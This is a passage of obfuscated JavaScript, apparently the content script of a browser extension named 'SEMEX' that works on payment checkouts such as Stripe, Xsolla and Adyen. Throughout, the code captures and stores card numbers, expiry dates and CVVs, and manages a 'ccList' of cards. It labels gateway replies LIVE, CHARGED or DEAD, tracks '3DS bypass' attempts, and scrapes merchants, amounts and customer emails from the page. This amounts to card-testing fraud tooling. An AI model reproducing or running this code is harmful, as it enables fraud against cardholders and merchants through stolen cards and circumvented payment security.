          try { window.postMessage({ type: "SEMEX_FILL_FORM_COMPLETE", ok: false, error: "no_stripe_frame" }, "*"); } catch (_e) {}
        }
      })();
      return;
    }
    try { window.postMessage({ type: "SEMEX_FILL_FORM_COMPLETE", ok: false, error: "no_stripe_frame" }, "*"); } catch (_eSF) {}
    return;
  }
  // Screenshot-timing probe: background polls this after a hit so the capture
  // lands when the success UI (green tick + starburst) is actually on screen.
  // Top frame only — iframe responders would race the channel.
  if (_0x53f1b1.type === "SEMEX_SUCCESS_UI_PROBE") {
    if (window !== window.top) return;
    try {
      // v4.0.17: report WHICH success signal fired so the background can scale
      // the screenshot settle — the animated Stripe green tick + starburst
      // ("tick") needs a longer settle to finish drawing crisp; a static
      // success/thank-you page needs only a short one. `ready` stays boolean.
      const _semexKind = _semexDetectSuccessUi();
      _0x163995({ ready: !!_semexKind, tick: _semexKind === "tick" });
    } catch (_eProbe) {
      _0x163995({ ready: false, tick: false });
    }
    return;
  }
});
// Success-state detector for the screenshot probe. Bounded and cheap: common
// green-tick/success markup (Stripe checkmark, success icons), the SEMEX
// overlay's own success status, a capped body-text scan, and URL patterns.
// Returns a "kind" string (tick|overlay|text|url) so the background can scale
// the screenshot settle, or null when no success signal is present. Checked
// tick-first so an animated checkout tick is never mislabelled as a plain
// success page when both a tick and a success URL are present at once.
function _semexDetectSuccessUi() {
  try {
    if (document.querySelector('[class*="Checkmark"], [class*="checkmark"], [data-testid*="success" i], [class*="success-icon" i], [class*="SuccessIcon"], [class*="ResultIcon--success" i]')) return "tick";
  } catch (_e1) {}
  try {
    const _ov = document.getElementById("semex-overlay");
    if (_ov && /charged|success|live/i.test((_ov.textContent || "").slice(0, 500))) return "overlay";
  } catch (_e2) {}
  try {
    const _txt = ((document.body && document.body.textContent) || "").slice(0, 4000);
    if (/payment (successful|complete|confirmed|received)|thank you for your (purchase|order|payment)|order confirmed|payment approved/i.test(_txt)) return "text";
  } catch (_e3) {}
  try {
    if (/(success|succeed|complete|thank|receipt|confirm)/i.test(window.location.pathname || "")) return "url";
  } catch (_e0) {}
  return null;
}
__name(_semexDetectSuccessUi, "_semexDetectSuccessUi");
window.addEventListener("message", _0x24b17b => {
  var _0x5f2c8f;
  if (_0x24b17b.data.type === "SEMEX_NETWORK_RESPONSE") {
    handleNetworkResponse(_0x24b17b.data);
  }
  if (_0x24b17b.data.type === "PAYMENT_STATUS_DETECTED" && window.top === window) {
    if (_0x24b17b.data._forOverlay) {
      return;
    }
    const _0x10e221 = ((_0x5f2c8f = _0x24b17b.data.gateway) == null ? undefined : _0x5f2c8f.toLowerCase()) || "";
    const _0x5bcf12 = _0x10e221 === "xsolla";
    if (_0x5bcf12 && _0x24b17b.data.status) {
      const _0x202266 = _0x24b17b.data.status;
      const _0x1eb1c1 = _0x24b17b.data.message || "";
      const _0x5c0d12 = _0x24b17b.data.card;
      const _0x221802 = _0x24b17b.data.url || window.location.href;
      const _0x3656ed = (_0x5c0d12 == null ? undefined : _0x5c0d12.number) || "unknown";
      const _0x3f5c5c = "xsolla:" + _0x202266 + ":" + _0x3656ed.slice(-4);
      if (!window._semexXsollaDedup) {
        window._semexXsollaDedup = new Map();
      }
      const _0x1f5b98 = Date.now();
      const _0x480a51 = window._semexXsollaDedup.get(_0x3f5c5c) || 0;
      if (_0x1f5b98 - _0x480a51 < 1500) {
        return;
      }
      window._semexXsollaDedup.set(_0x3f5c5c, _0x1f5b98);
      for (const [_0x2a8d78, _0x1aa5eb] of window._semexXsollaDedup.entries()) {
        if (_0x1f5b98 - _0x1aa5eb > 10000) {
          window._semexXsollaDedup.delete(_0x2a8d78);
        }
      }
      if (typeof window.showToast === "function") {
        window.showToast(_0x202266, "XSOLLA", _0x1eb1c1);
      }
      if (_0x202266 === "LIVE" || _0x202266 === "CHARGED" || _0x202266 === "CCN_LIVE") {
        playSuccessSound(_0x202266);
      }
      if (typeof saveTransaction === "function" && _0x5c0d12) {
        saveTransaction(_0x5c0d12, _0x202266, window.location.hostname, _0x1eb1c1, _0x1eb1c1);
      }
      try {
        if (chrome && chrome.runtime && chrome.runtime.sendMessage) {
          chrome.runtime.sendMessage({
            type: "PAYMENT_RESULT",
            status: _0x202266,
            card: _0x5c0d12,
            details: {
              gateway: "xsolla",
              url: _0x221802,
              siteUrl: window.location.href,
              hostname: window.location.hostname,
              declineReason: _0x1eb1c1,
              declineCode: _0x1eb1c1,
              threeDSBypassed: (Date.now() - (window.__semexLast3dsBypass || 0)) < 120000 ? "true" : ""
            }
          }).catch(() => {});
        }
      } catch (_0x694034) {}
      return;
    }
    handleNetworkResponse({
      url: _0x24b17b.data.url,
      response: _0x24b17b.data.response,
      body: _0x24b17b.data.response,
      card: _0x24b17b.data.card
    });
    return;
  }
  if (_0x24b17b.data.type === "CARD_DATA_CAPTURED" || _0x24b17b.data.type === "CARD_DATA_INTERCEPTED") {
    const _0x29dd98 = _0x24b17b.data.card;
    if (_0x29dd98 && _0x29dd98.number) {
      lastFilledCard = _0x29dd98;
      try {
        chrome.storage.session.set({
          __xlcard: _0x29dd98
        }).catch(() => {});
      } catch (_0x327341) {}
    }
  }
  if (_0x24b17b.data.type === "SEMEX_PERSIST_CARD" && _0x24b17b.data.card) {
    const _0x26130a = _0x24b17b.data.card;
    try {
      chrome.storage.local.set({
        __xpcard: _0x26130a,
        __xpcts: Date.now()
      }).then(() => {}).catch(_0x5e6003 => {});
    } catch (_0x538f2c) {}
  }
  if (_0x24b17b.data.type === "SITE_INFO_EXTRACTED") {
    cachedSiteInfo = _0x24b17b.data.siteInfo;
    try { _semexLastSiteInfoHost = window.location.hostname; } catch (_e) {}
  }
  // Patch from the cross-origin relay: interceptor.js in the top frame scrapes
  // merchant/product from the checkout.stripe.com DOM and posts this message so
  // ISOLATED-world content.js (which cannot read MAIN-world window properties)
  // can receive email/returnUrl/merchant/productName via a real DOM event.
  if (_0x24b17b.data.type === "_SEMEX_SITE_INFO_PATCH") {
    try {
      const _semexPatch = _0x24b17b.data;
      if (!cachedSiteInfo) cachedSiteInfo = {};
      if (_semexPatch.merchant && (!cachedSiteInfo.merchant || cachedSiteInfo.merchant === "N/A")) {
        cachedSiteInfo.merchant = _semexPatch.merchant;
      }
      if (_semexPatch.productName && !cachedSiteInfo.productName) {
        cachedSiteInfo.productName = _semexPatch.productName;
      }
      if (_semexPatch.email && !cachedSiteInfo.customerEmail) {
        cachedSiteInfo.customerEmail = _semexPatch.email;
      }
      if (_semexPatch.returnUrl && !cachedSiteInfo.successUrl) {
        cachedSiteInfo.successUrl = _semexPatch.returnUrl;
      }
      try { _semexLastSiteInfoHost = window.location.hostname; } catch (_e2) {}
    } catch (_semexPatchErr) {}
  }
  if (_0x24b17b.data.type === "SEMEX_TOAST") {
    const _0x3639ad = window.top !== window;
    const _0x3f9e43 = _0x24b17b.data;
    const _0x35bd0c = _0x3f9e43.url || window.location.href || "N/A";
    const _0x277684 = _0x3f9e43.messageType || "UNKNOWN";
    const _0xaa027a = _0x3f9e43.gateway || "N/A";
    const _0x406d8d = _0x3f9e43.bypassTypes || [];
    if (_0x277684 === "BYPASS_ACTIVATED" && _0x406d8d.includes("3DS")) {
      window.__semexLast3dsBypass = Date.now();
    }
    if (_0x3639ad) {
      window.top.postMessage(_0x24b17b.data, "*");
    } else if (typeof window.showToast === "function") {
      window.showToast(_0x24b17b.data);
    }
  }
  if (_0x24b17b.data.type === "SEMEX_CCLIST_UPDATE") {
    try {
      chrome.storage.local.get(["settings"], _0x247cbd => {
        const _0x564269 = _0x247cbd.settings || {};
        if (_0x564269.binOrCCList) {
          _0x564269.binOrCCList.ccList = _0x24b17b.data.remainingText || "";
          chrome.storage.local.set({
            settings: _0x564269
          });
        }
      });
    } catch (_0x4923ea) {}
  }
  if (_0x24b17b.data.type === "SEMEX_FETCH_INSTRUCTIONS") {
    const {
      url: _0x5f3c7e,
      method: _0x582c86,
      gateway: _0x13b90a,
      requestId: _0x55c9e8,
      isCheckout: _0x328304
    } = _0x24b17b.data;
    try {
      chrome.runtime.sendMessage({
        type: "FETCH_INSTRUCTIONS",
        url: _0x5f3c7e,
        method: _0x582c86,
        gateway: _0x13b90a,
        isCheckout: _0x328304
      }, _0x19fe29 => {
        if (chrome.runtime.lastError) {
          window.postMessage({
            type: "SEMEX_INSTRUCTIONS_RECEIVED",
            requestId: _0x55c9e8,
            instructions: {
              action: "NONE",
              error: chrome.runtime.lastError.message
            }
          }, "*");
          return;
        }
        window.postMessage({
          type: "SEMEX_INSTRUCTIONS_RECEIVED",
          requestId: _0x55c9e8,
          instructions: _0x19fe29 || {
            action: "NONE"
          }
        }, "*");
      });
    } catch (_0x485fb4) {
      window.postMessage({
        type: "SEMEX_INSTRUCTIONS_RECEIVED",
        requestId: _0x55c9e8,
        instructions: {
          action: "NONE",
          error: _0x485fb4.message || "Extension Context Invalidated"
        }
      }, "*");
    }
  }
});
const recentStatuses = new Map();
const DEDUP_WINDOW = 5000;
let lastFilledCard = null;
let cachedSiteInfo = null;
let _semexLastSiteInfoHost = null;
function mergeCardData(_0x5e03a9, _0x4381a6) {
  if (!_0x5e03a9 && !_0x4381a6) {
    return null;
  }
  const _0x544136 = _0x5e03a9 ? {
    number: _0x5e03a9.cardNumber || _0x5e03a9.number,
    month: _0x5e03a9.month || _0x5e03a9.exp_month,
    year: _0x5e03a9.year || _0x5e03a9.exp_year,
    cvv: _0x5e03a9.cvv || _0x5e03a9.cvc
  } : null;
  const _0x50d27d = _0x4381a6 ? {
    number: _0x4381a6.number,
    month: _0x4381a6.month || _0x4381a6.exp_month,
    year: _0x4381a6.year || _0x4381a6.exp_year,
    cvv: _0x4381a6.cvv || _0x4381a6.cvc
  } : null;
  const _0x101ddd = {
    number: (_0x50d27d == null ? undefined : _0x50d27d.number) || (_0x544136 == null ? undefined : _0x544136.number) || null,
    month: (_0x50d27d == null ? undefined : _0x50d27d.month) || (_0x50d27d == null ? undefined : _0x50d27d.exp_month) || (_0x544136 == null ? undefined : _0x544136.month) || (_0x544136 == null ? undefined : _0x544136.exp_month) || null,
    year: (_0x50d27d == null ? undefined : _0x50d27d.year) || (_0x50d27d == null ? undefined : _0x50d27d.exp_year) || (_0x544136 == null ? undefined : _0x544136.year) || (_0x544136 == null ? undefined : _0x544136.exp_year) || null,
    cvv: (_0x50d27d == null ? undefined : _0x50d27d.cvv) || (_0x50d27d == null ? undefined : _0x50d27d.cvc) || (_0x544136 == null ? undefined : _0x544136.cvv) || (_0x544136 == null ? undefined : _0x544136.cvc) || null
  };
  if (!_0x101ddd.number) {
    return null;
  }
  return _0x101ddd;
}
__name(mergeCardData, "mergeCardData");
setTimeout(() => {
  const _0x2faefe = window.location.hostname;
  let _0x3461a8 = false;
  try {
    _0x3461a8 = sessionStorage.getItem("IS_STRIPE_CHECKOUT") === "true";
  } catch (_0x35ec30) {}
  safeSendMessage({
    type: "CHECK_CONFIG",
    domain: _0x2faefe,
    isStripeCheckout: _0x3461a8
  });
}, 1000);
function extractDeclineCodes(_0x143f0b, _0x13580d, _0x5176ad = null) {
  let _0x9f26f0 = null;
  let _0x5e4b20 = null;
  if (!_0x143f0b || typeof _0x143f0b !== "object") {
    return {
      declineCode: null,
      errorCode: null
    };
  }
  if (_0x5176ad === "ua_required" || _0x5176ad === "cvc_required" || _0x5176ad === "3ds_bypass_failed") {
    return {
      declineCode: _0x5176ad,
      errorCode: _0x5176ad
    };
  }
  if (_0x143f0b.error) {
    _0x9f26f0 = _0x143f0b.error.decline_code || null;
    _0x5e4b20 = _0x143f0b.error.code || null;
  }
  if (!_0x9f26f0 && !_0x5e4b20 && _0x143f0b.last_payment_error) {
    _0x9f26f0 = _0x143f0b.last_payment_error.decline_code || null;
    _0x5e4b20 = _0x143f0b.last_payment_error.code || null;
  }
  if (!_0x9f26f0 && !_0x5e4b20 && _0x143f0b.last_setup_error) {
    _0x9f26f0 = _0x143f0b.last_setup_error.decline_code || null;
    _0x5e4b20 = _0x143f0b.last_setup_error.code || null;
  }
  if (!_0x9f26f0 && !_0x5e4b20) {
    if (_0x143f0b.type === "failed") {
      _0x9f26f0 = "failed";
      _0x5e4b20 = "failed";
    } else if (_0x143f0b.resultCode && (_0x143f0b.resultCode === "Refused" || _0x143f0b.resultCode === "Error")) {
      _0x9f26f0 = _0x143f0b.refusalReason || _0x143f0b.refusalreason || _0x143f0b.resultCode;
      _0x5e4b20 = _0x143f0b.errorCode || _0x143f0b.resultCode;
    } else if (_0x143f0b.data) {
      const _0x30ca49 = _0x143f0b.data;
      if (_0x30ca49.resultCode && (_0x30ca49.resultCode === "Refused" || _0x30ca49.resultCode === "Error")) {
        _0x9f26f0 = _0x30ca49.refusalReason || _0x30ca49.refusalreason || _0x30ca49.resultCode;
        _0x5e4b20 = _0x30ca49.errorCode || _0x30ca49.resultCode;
      }
    }
    if (_0x143f0b.resultCode === "RedirectShopper" || _0x143f0b.resultCode === "ChallengeShopper") {
      _0x9f26f0 = "3ds_required";
      _0x5e4b20 = "3ds_required";
    }
  }
  if (_0x13580d === "CCN_LIVE") {
    const _0xc88137 = JSON.stringify(_0x143f0b).toLowerCase();
    if (_0xc88137.includes("previously used")) {
      _0x9f26f0 = "duplicate_card";
    }
  }
  if (_0x13580d === "DEAD" && _0x143f0b && _0x143f0b.error) {
    const _0x5e934b = JSON.stringify(_0x143f0b.error).toLowerCase();
    if (_0x143f0b.error.type === "invalid_request_error" && _0x5e934b.includes("invalid json")) {
      _0x9f26f0 = "3ds_bypass_failed";
      _0x5e4b20 = "3ds_bypass_failed";
    }
  }
  return {
    declineCode: _0x9f26f0,
    errorCode: _0x5e4b20
  };
}
__name(extractDeclineCodes, "extractDeclineCodes");
// Aggressive DOM scraping for site / merchant / amount. Used as a fallback when
// the gateway response does not carry these fields.
//   - Merchant: <meta og:site_name> → apple-mobile-web-app-title → schema.org name
//     → document.title (cleaned) → hostname.
//   - Amount: prefer elements near "total"/"grand total"/"amount due" keywords,
//     with a currency symbol / ISO code adjacent. Falls back to any money-pattern
//     in the page. Robust to comma/dot thousand separators and stray suffixes.
const _SEMEX_CURRENCY_SYMBOLS = {
  "$": "USD", "€": "EUR", "£": "GBP", "¥": "JPY",
  "₹": "INR", "₽": "RUB", "₩": "KRW", "R$": "BRL",
  "A$": "AUD", "CA$": "CAD", "HK$": "HKD", "NZ$": "NZD",
  "S$": "SGD", "kr": "SEK", "zł": "PLN", "₺": "TRY",
  "₱": "PHP", "฿": "THB", "RM": "MYR", "Rp": "IDR",
  "₴": "UAH", "﷼": "SAR", "د.إ": "AED", "R": "ZAR",
  // v5.0.1: South Asian + additional currencies missing from original set
  "रू": "NPR", "Rs.": "LKR", "Tk": "BDT", "₦": "NGN",
  "₸": "KZT", "лв": "BGN", "Kč": "CZK", "Ft": "HUF",
};
const _SEMEX_ISO_CODES = new Set([
  "USD","EUR","GBP","JPY","INR","AUD","CAD","CHF","CNY","HKD","NZD","SGD","SEK",
  "KRW","MXN","BRL","RUB","ZAR","TRY","PLN","IDR","THB","MYR","PHP","VND","AED",
  "SAR","EGP","NGN","PKR","BDT","LKR","NOK","DKK","CZK","HUF","ILS","CLP","ARS",
  "COP","PEN","UAH","RON","BGN",
  // v5.0.1: currencies that were missing and caused DOM-scrape to miss amounts
  "NPR","KZT","GHS","KES","TZS","UGX","XOF","XAF","MAD","DZD","TND","ETB",
  "MMK","KHR","LAK","MNT","AMD","GEL","AZN","BYN","MDL","UZS","TJS","KGS",
  "AFN","IQD","SYP","YER","OMR","KWD","BHD","QAR","JOD","LBP","ILS",
]);
function _semexParseMoney(text) {
  if (!text) return null;
  const s = String(text).trim();
  // Try ISO code + number OR number + ISO code
  let m = s.match(/(?:^|\s|>)([A-Z]{3})\s*[:\-\s]?\s*([0-9]{1,3}(?:[,.\s][0-9]{3})*(?:[.,][0-9]{1,2})?|[0-9]+(?:[.,][0-9]{1,2})?)/);
  if (m && _SEMEX_ISO_CODES.has(m[1])) {
    const n = _semexNormalizeNumber(m[2]);
    if (n !== null) return { amount: n, currency: m[1] };
  }
  m = s.match(/([0-9]{1,3}(?:[,.\s][0-9]{3})*(?:[.,][0-9]{1,2})?|[0-9]+(?:[.,][0-9]{1,2})?)\s*([A-Z]{3})(?:$|[^A-Z])/);
  if (m && _SEMEX_ISO_CODES.has(m[2])) {
    const n = _semexNormalizeNumber(m[1]);
    if (n !== null) return { amount: n, currency: m[2] };
  }
  // Symbol + number
  const symKeys = Object.keys(_SEMEX_CURRENCY_SYMBOLS).sort((a, b) => b.length - a.length);
  for (const sym of symKeys) {
    const idx = s.indexOf(sym);
    if (idx === -1) continue;
    const after = s.slice(idx + sym.length);
    const numMatch = after.match(/^\s*([0-9]{1,3}(?:[,.\s][0-9]{3})*(?:[.,][0-9]{1,2})?|[0-9]+(?:[.,][0-9]{1,2})?)/);
    if (numMatch) {
      const n = _semexNormalizeNumber(numMatch[1]);
      if (n !== null) return { amount: n, currency: _SEMEX_CURRENCY_SYMBOLS[sym] };
    }
    // Also try number BEFORE the symbol (e.g. "250 kr")
    const before = s.slice(0, idx);
    const numMatch2 = before.match(/([0-9]{1,3}(?:[,.\s][0-9]{3})*(?:[.,][0-9]{1,2})?|[0-9]+(?:[.,][0-9]{1,2})?)\s*$/);
    if (numMatch2) {
      const n = _semexNormalizeNumber(numMatch2[1]);
      if (n !== null) return { amount: n, currency: _SEMEX_CURRENCY_SYMBOLS[sym] };
    }
  }
  return null;
}
function _semexNormalizeNumber(raw) {
  if (!raw) return null;
  let s = String(raw).replace(/\s/g, "");
  // Heuristics for comma vs dot decimal.
  const lastComma = s.lastIndexOf(",");
  const lastDot = s.lastIndexOf(".");
  if (lastComma > lastDot) {
    // European style — comma is decimal, dot is thousands.
    s = s.replace(/\./g, "").replace(/,/, ".");
    s = s.replace(/,/g, "");
  } else if (lastDot > lastComma) {
    s = s.replace(/,/g, "");
  } else {
    s = s.replace(/[,.]/g, "");
  }
  const n = parseFloat(s);
  return isFinite(n) && n > 0 ? n : null;
}
function _semexScrapeAmountFromDom() {
  const HINTS = /\b(grand\s*total|total\s*(?:due|amount|price|charge|payable)?|amount\s*(?:due|payable|to\s*pay)?|to\s*pay|order\s*total|final\s*total|you\s*pay|charged?)\b/i;
  const seen = new Set();
  const results = []; // [{score, amount, currency, text}]
  let doc;
  try { doc = window.top.document || document; } catch (_e) { doc = document; }
  const walker = doc.createTreeWalker(doc.body || doc.documentElement, NodeFilter.SHOW_ELEMENT, null);
  let node;
  let count = 0;
  while ((node = walker.nextNode()) && count < 800) {
    count++;
    // Skip hidden nodes for perf + accuracy
    const cs = getComputedStyle(node);
    if (cs.display === "none" || cs.visibility === "hidden") continue;
    const own = (node.innerText || "").trim();
    if (!own || own.length > 200 || seen.has(own)) continue;
    seen.add(own);
    const money = _semexParseMoney(own);
    if (!money) continue;
    // Sanity clamp: no obviously bogus values (e.g., a footer year "2026")
    if (money.amount > 1e9) continue;
    // Score: bigger if this element (or ancestor within 3 levels) matches HINTS.
    let score = 1;
    let hintText = "";
    let cur = node;
    for (let d = 0; d < 3 && cur; d++) {
      const near = ((cur.getAttribute && (cur.getAttribute("data-testid") || cur.getAttribute("aria-label") || cur.className || "")) + " " + (cur.previousElementSibling && cur.previousElementSibling.innerText || "") + " " + (cur.parentElement && cur.parentElement.innerText || "").slice(0, 200));
      if (HINTS.test(near)) { score += 10 - d * 2; hintText = near.slice(0, 60); break; }
      cur = cur.parentElement;
    }
    // Bonus for currency + number ONLY (not embedded in a paragraph)
    if (own.length < 40) score += 2;
    results.push({ score, amount: money.amount, currency: money.currency, text: own, hintText });
  }
  if (!results.length) return null;
  results.sort((a, b) => b.score - a.score || b.amount - a.amount);
  return { amount: results[0].amount, currency: results[0].currency, _source: "dom_scrape", _hint: results[0].hintText };
}
function _semexScrapeMerchant() {
  const doc = document;
  const pick = (sel, attr) => {
    try {
      const el = doc.querySelector(sel);
      if (!el) return null;
      const v = attr ? el.getAttribute(attr) : el.textContent;
      return v ? String(v).trim() : null;
    } catch (_e) { return null; }
  };
  return (
    // Stripe habanero checkout: merchant name is in data-testid="business-name"
    pick('[data-testid="business-name"]', null) ||
    pick('meta[property="og:site_name"]', "content") ||
    pick('meta[name="application-name"]', "content") ||
    pick('meta[name="apple-mobile-web-app-title"]', "content") ||
    pick('meta[itemprop="name"]', "content") ||
    (function () {
      const t = (doc.title || "").trim();
      if (!t) return null;
      // Clean "Checkout · Acme Store" → "Acme Store"
      const parts = t.split(/\s[·|\-–—]\s/);
      return (parts[parts.length - 1] || t).slice(0, 80);
    })() ||
    null
  );
}
function _semexScrapeProduct() {
  const doc = document;
  const clean = function (_v) {
    if (!_v) return null;
    const s = String(_v).replace(/\s+/g, " ").trim();
    if (!s) return null;
    return s.length <= 100 ? s : s.slice(0, 100);
  };
  const pickText = function (sel) {
    try {
      const el = doc.querySelector(sel);
      return el ? clean(el.textContent) : null;
    } catch (_e) {
      return null;
    }
  };
  // Only explicit product / line-item summaries. Never fall back to og:title or
  // document.title — those just duplicate the merchant name. If nothing explicit
  // is present (typical for a bare card-setup SetupIntent), stay null.
  return pickText('[data-testid="product-summary-name"]') || pickText('[data-testid="line-item-product-name"]') || pickText(".ProductSummary-name") || pickText('[class*="ProductSummary"] [class*="name"]') || pickText('[class*="OrderSummary"] [class*="productName"]') || pickText('[class*="line-item"] [class*="name"]') || null;
}
function _semexScrapeEmail() {
  try {
    const doc = document;
    const sels = ["input[type=\"email\"]", "input[autocomplete=\"email\"]", "input[name*=\"email\" i]", "input[id*=\"email\" i]"];
    for (let i = 0; i < sels.length; i++) {
      const el = doc.querySelector(sels[i]);
      if (el && el.value && /.+@.+\..+/.test(el.value)) {
        return el.value.trim();
      }
    }
  } catch (_e) {}
  return null;
}
function extractAmountCurrency(_0x46f911) {
  let _0x5ac232 = null;
  let _0xf60912 = null;
  if (_0x46f911 && typeof _0x46f911 === "object") {
    _0x5ac232 = _0x46f911.amount || null;
    _0xf60912 = _0x46f911.currency || null;
  }
  // Aggressive DOM scrape fallback when the gateway response didn't carry it.
  if (!_0x5ac232) {
    try {
      const scraped = _semexScrapeAmountFromDom();
      if (scraped && scraped.amount) {
        _0x5ac232 = scraped.amount;
        if (!_0xf60912) _0xf60912 = scraped.currency;
      }
    } catch (_e) {}
  }
  return {
    amount: _0x5ac232,
    currency: _0xf60912
  };
}
__name(extractAmountCurrency, "extractAmountCurrency");
function extractCustomerEmail(_0x10db3f) {
  let _0xedf76d = null;
  if (!_0x10db3f || typeof _0x10db3f !== "object") {
    return null;
  }
  if (_0x10db3f.customer_email) {
    return _0x10db3f.customer_email;
  }
  if (_0x10db3f.receipt_email) {
    return _0x10db3f.receipt_email;
  }
  if (_0x10db3f.customer && _0x10db3f.customer.email) {
    return _0x10db3f.customer.email;
  }
  if (_0x10db3f.error && _0x10db3f.error.payment_method && _0x10db3f.error.payment_method.billing_details) {
    if (_0x10db3f.error.payment_method.billing_details.email) {
      return _0x10db3f.error.payment_method.billing_details.email;
    }
  }
  if (_0x10db3f.payment_method && _0x10db3f.payment_method.billing_details) {
    if (_0x10db3f.payment_method.billing_details.email) {
      return _0x10db3f.payment_method.billing_details.email;
    }
  }
  return null;
}
__name(extractCustomerEmail, "extractCustomerEmail");
// Find the merchant's real website from links rendered on the Stripe checkout
// page. Stripe-hosted pages (checkout/invoice/billing.stripe.com) usually link
// the business name in the header, and Terms/Privacy/Refund links in the
// footer, to the merchant's own domain. Used when Stripe's response carries no
// business_url/success_url — otherwise Site falls back to the Stripe host.
function _semexScrapeMerchantSite(_0xmerchantName) {
  try {
    const _doc = document;
    const _skip = /(^|\.)(stripe\.com|stripe\.network|stripecdn\.com|stripe\.dev|google\.com|apple\.com|paypal\.com|link\.co)$/i;
    const _links = Array.from(_doc.querySelectorAll("a[href^=\"http\"]"));
    const _mName = String(_0xmerchantName || "").trim().toLowerCase();
    let _best = null;
    for (let i = 0; i < _links.length; i++) {
      let _u;
      try { _u = new URL(_links[i].href); } catch (_e) { continue; }
      if (!_u.hostname || _skip.test(_u.hostname)) continue;
      const _txt = String(_links[i].textContent || "").trim().toLowerCase();
      const _aria = String(_links[i].getAttribute("aria-label") || "").toLowerCase();
      const _origin = _u.protocol + "//" + _u.hostname + "/";
      // A link whose text/aria-label matches the merchant name (header business
      // link) wins outright.
      if (_mName && (_txt === _mName || _aria.includes(_mName))) {
        return _origin;
      }
      // Otherwise remember the first external link in the header area
      // (business name / logo), then terms/privacy-style links as fallback.
      if (!_best) {
        const _inHeader = !!_links[i].closest("header, [class*='Header'], [class*='BusinessName'], [data-testid*='business']");
        const _isLegal = /terms|privacy|refund|impressum|legal/.test(_txt);
        _best = { origin: _origin, score: _inHeader ? 2 : (_isLegal ? 1 : 0) };
      } else if (_best.score < 2) {
        const _inHeader = !!_links[i].closest("header, [class*='Header'], [class*='BusinessName'], [data-testid*='business']");
        if (_inHeader) { _best = { origin: _origin, score: 2 }; }
        else if (_best.score < 1 && /terms|privacy|refund|impressum|legal/.test(_txt)) { _best = { origin: _origin, score: 1 }; }
      }
    }
    return _best ? _best.origin : null;
  } catch (_e) { return null; }
}
function extractSiteDomain() {
  let _0x53247d = null;
  try {
    if (window.top === window) {
      _0x53247d = window.location.origin;
    } else {
      try {
        _0x53247d = window.top.location.origin;
      } catch (_0x559b11) {
        if (document.referrer) {
          try {
            const _0x504751 = new URL(document.referrer);
            _0x53247d = _0x504751.origin;
          } catch (_0x3e99b6) {
            _0x53247d = window.location.origin;
          }
        } else {
          _0x53247d = window.location.origin;
        }
      }
    }
  } catch (_0x1c52e2) {
    _0x53247d = window.location.origin;
  }
  return _0x53247d;
}
__name(extractSiteDomain, "extractSiteDomain");
function extractHostname() {
  let _0xf81ade = null;
  try {
    if (window.top === window) {
      _0xf81ade = window.location.hostname;
    } else {
      try {
        _0xf81ade = window.top.location.hostname;
      } catch (_0x3fef6a) {
        if (document.referrer) {
          try {
            const _0x3bd937 = new URL(document.referrer);
            _0xf81ade = _0x3bd937.hostname;
          } catch (_0x3e759e) {
            _0xf81ade = window.location.hostname;
          }
        } else {
          _0xf81ade = window.location.hostname;
        }
      }
    }
  } catch (_0x3002aa) {}
  return _0xf81ade;
}
__name(extractHostname, "extractHostname");
function handleNetworkResponse(_0x3894dd) {
  if (!STATUS_PARSER) {
    return;
  }
  function _0x52445f(_0x4bc635) {
    // v2.9.3: host-aware Stripe surface detection — hosted invoice / billing /
    // checkout pages get their own gateway identity so the notification says
    // exactly which surface fired instead of everything being "stripe_inbuilt".
    try {
      const _semexPageHost = (window.location.hostname || "").toLowerCase();
      if (_semexPageHost === "invoice.stripe.com") {
        return "stripe_invoice";
      }
      if (_semexPageHost === "billing.stripe.com") {
        return "stripe_billing";
      }
      // Hosted checkout pages are Stripe Checkout, never "inbuilt".
      if (_semexPageHost === "checkout.stripe.com" || _semexPageHost === "pay.stripe.com" || _semexPageHost === "buy.stripe.com" || _semexPageHost === "donate.stripe.com") {
        return "stripe_checkout";
      }
      // Inside the cross-origin js.stripe.com elements iframe the top frame's
      // hostname and sessionStorage are both invisible — the embedding page is
      // only reachable via document.referrer. Without this, hosted-checkout
      // hits detected in the iframe were mislabeled "stripe_inbuilt".
      if (_semexPageHost === "js.stripe.com") {
        const _semexRef = (document.referrer || "").toLowerCase();
        if (_semexRef.includes("//invoice.stripe.com")) return "stripe_invoice";
        if (_semexRef.includes("//billing.stripe.com")) return "stripe_billing";
        if (_semexRef.includes("//checkout.stripe.com") || _semexRef.includes("//pay.stripe.com") || _semexRef.includes("//buy.stripe.com") || _semexRef.includes("//donate.stripe.com")) {
          return "stripe_checkout";
        }
      }
    } catch (_eHost) {}
    if (!_0x4bc635) {
      return "stripe_inbuilt";
    }
    try {
      const _0x1de023 = sessionStorage.getItem("IS_STRIPE_CHECKOUT") === "true";
      if (_0x1de023) {
        return "stripe_checkout";
      }
    } catch (_0x4f62ba) {}
    const _0xf07be2 = _0x4bc635.toLowerCase();
    if (_0xf07be2.includes("adyen.com") || _0xf07be2.includes("/adyen/") || _0xf07be2.includes("checkoutshopper")) {
      return "adyen";
    }
    if (_0xf07be2.includes("api.gog.com") && (_0xf07be2.includes("/payment") || _0xf07be2.includes("/checkout") || _0xf07be2.includes("/order") || _0xf07be2.includes("/purchase"))) {
      return "adyen";
    }
    if (_0xf07be2.includes("checkout.com")) {
      return "checkout";
    }
    if (_0xf07be2.includes("api.recurly.com") || _0xf07be2.includes("/recurly/") || _0xf07be2.includes("/create-subscription")) {
      return "recurly";
    }
    if (_0xf07be2.includes("api.stripe.com")) {
      return "stripe_inbuilt";
    }
    return "stripe_inbuilt";
  }
  __name(_0x52445f, "detectGateway");
  const _0x29f6de = _0x3894dd.response || _0x3894dd.body || {};
  if (typeof _0x29f6de === "object" && _0x3894dd.url) {
    _0x29f6de._url = _0x3894dd.url;
  }
  let _0xc9ba0b = STATUS_PARSER.parse(_0x29f6de);
  let _0x45ee39 = null;
  let _0x288964 = null;
  if (_0xc9ba0b) {
    if (typeof _0xc9ba0b === "object") {
      _0x45ee39 = _0xc9ba0b.status;
      _0x288964 = _0xc9ba0b.message;
    } else {
      _0x45ee39 = _0xc9ba0b;
    }
  }
  if (_0x45ee39) {
    const _0x550427 = window.top !== window;
    if (_0x550427) {
      try {
        const _0x2e424d = _0x3894dd.response || _0x3894dd.body;
        const {
          declineCode: _0x427a2f,
          errorCode: _0x58bf49
        } = extractDeclineCodes(_0x2e424d, _0x45ee39, _0x288964);
        const _0x13532a = {
          type: "PAYMENT_STATUS_DETECTED",
          status: _0x45ee39,
          url: _0x3894dd.url,
          response: _0x2e424d,
          body: _0x2e424d,
          gateway: _0x52445f(_0x3894dd.url),
          declineCode: _0x427a2f,
          errorCode: _0x58bf49,
          declineReason: _0x288964,
